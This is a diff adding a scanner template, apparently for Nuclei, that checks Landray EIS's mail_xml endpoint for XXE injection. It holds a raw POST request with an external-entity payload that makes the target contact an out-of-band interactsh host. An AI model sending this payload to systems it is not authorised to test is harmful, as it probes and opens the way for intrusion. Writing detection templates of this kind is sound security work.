@@ -1,0 +1,41 @@
+id: landray-eis-mail_server-xxe
+info:
+  name: 蓝凌EIS智慧协同平台mail_xml存在XXE注入
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEIS%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0mail_xml%E5%AD%98%E5%9C%A8XXE%E6%B3%A8%E5%85%A5.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,xxe,landray,eis
+
+http:
+  - raw:
+      - |
+        POST /mail/mail_server.aspx/mail_xml?type=add HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/Xml
+        Content-Length: 93
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
